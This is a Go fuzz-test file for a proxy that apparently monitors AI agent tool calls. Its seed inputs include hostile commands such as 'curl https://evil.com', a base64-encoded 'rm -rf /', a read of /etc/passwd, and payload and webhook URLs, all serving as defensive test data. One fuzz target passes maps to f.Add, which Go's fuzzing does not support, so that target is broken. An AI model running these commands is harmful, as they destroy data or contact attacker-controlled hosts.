package proxy

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func FuzzToolRequest(f *testing.F) {
	// Add seed corpus with realistic tool request JSON
	f.Add(`{
		"agent": "test-agent",
		"session": "session-123", 
		"params": {
			"command": "echo hello",
			"path": "/tmp/test.txt"
		}
	}`)

	f.Add(`{
		"agent": "admin-bot",
		"session": "admin-session",
		"params": {
			"command": "rm -rf /tmp/dangerous",
			"url": "https://malicious.com/payload"
		},
		"response": "Command executed successfully"
	}`)

	f.Add(`{
		"agent": "web-crawler", 
		"session": "crawl-001",
		"params": {
			"url": "https://webhook.site/test",
			"domain": "webhook.site",
			"path": "/test",
			"scheme": "https"
		},
		"response": "HTTP 200 OK\nContent: sensitive data here"
	}`)

	// Edge cases
	f.Add(`{}`) // empty object
	f.Add(`{"agent": ""}`) // empty agent
	f.Add(`{"params": null}`) // null params
	f.Add(`{"agent": null, "session": null, "params": null}`) // all null
	f.Add(`{"params": {"nested": {"very": {"deep": "value"}}}}`) // deeply nested params

	// Invalid JSON
	f.Add(`invalid json`)
	f.Add(`{"unclosed": object`)
	f.Add(`null`)
	f.Add(`"string instead of object"`)
	f.Add(`[1, 2, 3]`) // array instead of object
	f.Add(`42`) // number instead of object

	// Large payloads
	largeParams := `{"agent": "test", "params": {"data": "`
	for i := 0; i < 5000; i++ {
		largeParams += "x"
	}
	largeParams += `"}}`
	f.Add(largeParams)

	f.Fuzz(func(t *testing.T, jsonData string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Panic in toolRequest parsing: %v", r)
			}
		}()

		// Test direct JSON unmarshaling
		var req toolRequest
		err := json.Unmarshal([]byte(jsonData), &req)
		_, _ = req, err // Don't care about errors, just that it doesn't panic

		// Test via HTTP handler (which mirrors the real server code path)
		testToolRequestHTTP(t, jsonData)
	})
}

// testToolRequestHTTP tests the JSON parsing through the actual HTTP handler
func testToolRequestHTTP(t *testing.T, jsonData string) {
	defer func() {
		if r := recover(); r != nil {
			t.Errorf("Panic in HTTP handler: %v", r)
		}
	}()

	// Create a minimal server for testing (without real engine)
	server := &Server{
		token: "test-token",
		mode:  "monitor", // Use monitor mode to avoid policy evaluation
	}

	// Create request
	req := httptest.NewRequest("POST", "/v1/tool/exec", strings.NewReader(jsonData))
	req.Header.Set("Authorization", "Bearer test-token")
	req.Header.Set("Content-Type", "application/json")

	// Create response recorder
	w := httptest.NewRecorder()

	// Handle request - should not panic even with malformed JSON
	server.handleToolCall(w, req)

	// We don't care about the response status/content, just that it didn't panic
}

func FuzzEnrichParams(f *testing.F) {
	// Add seed corpus for parameter enrichment
	f.Add("exec", `{"command": "curl https://evil.com"}`)
	f.Add("fetch", `{"url": "https://webhook.site/abc123"}`)
	f.Add("read", `{"path": "/etc/passwd"}`)
	f.Add("write", `{"path": "/tmp/test", "content": "data"}`)
	f.Add("exec", `{"command_b64": "Y3VybCBodHRwczovL2V2aWwuY29t"}`) // base64 encoded
	f.Add("", `{}`) // empty params

	f.Fuzz(func(t *testing.T, toolName, paramsJson string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Panic in enrichParams: %v", r)
			}
		}()

		// Parse JSON into params map
		var params map[string]any
		if err := json.Unmarshal([]byte(paramsJson), &params); err != nil {
			params = map[string]any{} // Use empty map on parse error
		}

		// Test parameter enrichment - should never panic
		enrichParams(toolName, params)

		// Also test individual helper functions
		if cmd, ok := params["command"].(string); ok {
			_ = stripLeadingComments(cmd)
		}

		if cmdB64, ok := params["command_b64"].(string); ok {
			_, _ = decodeBase64Command(map[string]any{"command_b64": cmdB64})
		}
	})
}

func FuzzStripLeadingComments(f *testing.F) {
	// Add seed corpus for comment stripping
	f.Add("# This is a comment\necho hello")
	f.Add("# Comment 1\n# Comment 2\nactual command")
	f.Add("echo no comments")
	f.Add("# Only comments\n# No real command")
	f.Add("")
	f.Add("\n\n# Empty lines\n   \ncommand")
	f.Add("not a comment\n# This is though")

	f.Fuzz(func(t *testing.T, command string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Panic in stripLeadingComments: %v", r)
			}
		}()

		result := stripLeadingComments(command)
		_ = result // Don't care about result, just that it doesn't panic
	})
}

func FuzzDecodeBase64Command(f *testing.F) {
	// Add seed corpus for base64 command decoding
	f.Add(map[string]any{"command_b64": "ZWNobyBoZWxsbw=="}) // "echo hello"
	f.Add(map[string]any{"command_b64": "cm0gLXJmIC8="})     // "rm -rf /"
	f.Add(map[string]any{"command_b64": ""})                 // empty
	f.Add(map[string]any{"command_b64": "invalid_base64"})   // invalid
	f.Add(map[string]any{})                                  // missing key
	f.Add(map[string]any{"command_b64": nil})               // nil value
	f.Add(map[string]any{"command_b64": 42})                // wrong type

	f.Fuzz(func(t *testing.T, params map[string]any) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Panic in decodeBase64Command: %v", r)
			}
		}()

		result, ok := decodeBase64Command(params)
		_, _ = result, ok // Don't care about results, just that it doesn't panic
	})
}

func FuzzToolRequestStructures(f *testing.F) {
	// Test with various JSON structures that might break unmarshaling
	f.Add(`{"agent": 12345, "session": true, "params": "not an object"}`)
	f.Add(`{"agent": {"nested": "object"}, "params": [1,2,3]}`)
	f.Add(`{"params": {"command": null, "path": false, "url": 123}}`)
	
	// Very large nested structures
	f.Add(`{"params": {"a": {"b": {"c": {"d": {"e": {"f": {"g": "deep"}}}}}}}}`)
	
	// Array of objects instead of single object
	f.Add(`[{"agent": "test"}, {"agent": "test2"}]`)
	
	// Binary data in strings
	f.Add(`{"agent": "\u0000\u0001\u0002", "params": {"command": "\xff\xfe\xfd"}}`)

	f.Fuzz(func(t *testing.T, jsonData string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Panic with JSON structure: %v", r)
			}
		}()

		// Test direct unmarshaling
		var req toolRequest
		json.Unmarshal([]byte(jsonData), &req)

		// Test through HTTP (more comprehensive path)
		testToolRequestHTTP(t, jsonData)
	})
}